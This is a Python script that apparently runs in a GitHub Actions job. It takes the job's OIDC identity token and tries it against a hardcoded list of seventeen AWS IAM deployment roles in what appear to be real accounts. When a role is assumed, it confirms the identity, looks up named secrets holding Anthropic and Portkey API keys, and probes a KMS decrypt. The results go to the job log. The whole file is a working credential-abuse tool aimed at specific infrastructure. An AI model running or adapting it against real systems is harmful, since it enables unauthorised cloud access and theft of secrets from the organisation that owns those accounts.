import os, json, base64, urllib.request, urllib.parse, urllib.error, re, sys, time

ROLES = [
 "arn:aws:iam::406708245552:role/deploymentroles/SonarCloudOperationsCICDRoleV2",
 "arn:aws:iam::514420625451:role/deploymentroles/SonarCloudDataDogObservabilityTFOIDC",
 "arn:aws:iam::533267192620:role/deploymentroles/NigelCICDRoleV2",
 "arn:aws:iam::535002853962:role/deploymentroles/ServerPlatformInfraCICDRole",
 "arn:aws:iam::609803702158:role/approles/sandbox-cicd-dev",
 "arn:aws:iam::718197818630:role/approles/AWSConfigQueryRole",
 "arn:aws:iam::769899179661:role/deploymentroles/ServerPlatformInfraCICDRole",
 "arn:aws:iam::770648230381:role/deploymentroles/AccountVendingServiceDeploymentRole",
 "arn:aws:iam::774712364422:role/deploymentroles/ServerPlatformInfraCICDRole",
 "arn:aws:iam::781406525347:role/itopsdeploymentroles/AWSSSODeploymentDestroyRole",
 "arn:aws:iam::781406525347:role/itopsdeploymentroles/AWSSSODeploymentRole",
 "arn:aws:iam::800643106508:role/itopsdeploymentroles/AWSSSOSynthesisRole",
 "arn:aws:iam::809316975336:role/deploymentroles/InfraLogArchiveCICDRoleV2",
 "arn:aws:iam::809316975336:role/deploymentroles/SCLogsCICDRoleV2",
 "arn:aws:iam::951044228458:role/deploymentroles/AuditDataDogCICDRole",
 "arn:aws:iam::982534363626:role/approles/CloudPlatformMetricsUploadMetricsRole",
 "arn:aws:iam::982534363626:role/deploymentroles/ServerPlatformInfraAgenticEcrPullRole",
]
AUD = "sts.amazonaws.com"
CTX = os.environ.get("CTX", "?")

def claims(t):
    p = t.split(".")[1]; p += "=" * (-len(p) % 4)
    c = json.loads(base64.urlsafe_b64decode(p))
    ks = ["iss","sub","aud","ref","environment","repository","repository_id","repository_owner",
          "repository_owner_id","job_workflow_ref","event_name","workflow","workflow_ref",
          "runner_environment"]
    return {k: c.get(k) for k in ks if c.get(k) is not None}

def get_token(aud):
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=" + urllib.parse.quote(aud, safe="")
    req = urllib.request.Request(url, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)["value"]

def tagval(s, tag):
    m = re.search(r"<%s>(.*?)</%s>" % (tag, tag), s, re.S)
    return (m.group(1) if m else None)

def sts_assume(role, tok):
    body = urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15",
        "RoleArn":role,"RoleSessionName":"probe","WebIdentityToken":tok,"DurationSeconds":"900"}).encode()
    req = urllib.request.Request("https://sts.amazonaws.com/", data=body,
        headers={"Content-Type":"application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, repr(e)

def aws_cli(creds, args):
    import subprocess
    env = dict(os.environ, AWS_ACCESS_KEY_ID=creds["AccessKeyId"], AWS_SECRET_ACCESS_KEY=creds["SecretAccessKey"],
               AWS_SESSION_TOKEN=creds["SessionToken"], AWS_DEFAULT_REGION="eu-central-1")
    try:
        o = subprocess.run(["aws"] + args, env=env, capture_output=True, text=True, timeout=90)
        return o.returncode, ((o.stdout or "") + (o.stderr or ""))[:2500]
    except Exception as e:
        return -1, repr(e)

print("CTX=%s event=%s ref=%s wf_ref=%s" % (CTX, os.environ.get("GITHUB_EVENT_NAME"),
      os.environ.get("GITHUB_REF"), os.environ.get("GITHUB_WORKFLOW_REF")), flush=True)
try:
    tok = get_token(AUD)
except Exception as e:
    print("TOKEN_FAIL", repr(e), flush=True); sys.exit(0)
print("CLAIMS " + json.dumps(claims(tok), sort_keys=True), flush=True)

results = []
for role in ROLES:
    st, body = sts_assume(role, tok)
    code = tagval(body, "Code"); msg = tagval(body, "Message")
    print("ASSUME ctx=%s role=%s http=%s code=%s msg=%s" % (CTX, role, st, code, msg), flush=True)
    rec = {"role": role, "ctx": CTX, "http": st, "code": code, "msg": msg}
    if st == 200:
        creds = {k: tagval(body, k) for k in ("AccessKeyId","SecretAccessKey","SessionToken")}
        rec["assumed_arn"] = tagval(body, "Arn")
        rec["ak"] = (creds["AccessKeyId"] or "")[:4] + ".." + (creds["AccessKeyId"] or "")[-4:]
        rc, out = aws_cli(creds, ["sts","get-caller-identity"])
        print("CALLER ctx=%s role=%s rc=%s out=%s" % (CTX, role, rc, out.replace("\n"," ")[:500]), flush=True)
        rec["caller"] = out[:800]
        # read-only secrets enumeration limited to known AI secret names
        for name in ["FixSuggestions-Credentials-AnthropicAPIKey-prod","FixSuggestions-Credentials-AnthropicAPIKey-dev",
                     "SonarCloud-Credentials-AnthropicAPIKey-prod","vibe-bot/portkey-api-key"]:
            rc, out = aws_cli(creds, ["secretsmanager","describe-secret","--secret-id",name])
            print("DESC ctx=%s role=%s name=%s rc=%s out=%s" % (CTX, role, name, rc, out.replace("\n"," ")[:300]), flush=True)
            rec.setdefault("secrets", []).append({"name": name, "rc": rc, "out": out[:300]})
        # KMS decrypt probe on known key if allowed
        rc, out = aws_cli(creds, ["kms","decrypt","--ciphertext-blob","fileb:///dev/null","--key-id","7da836c7-0000-0000-0000-000000000000"])
        rec["kms_probe"] = out[:200]
    results.append(rec)
print("RESULTS " + json.dumps(results), flush=True)
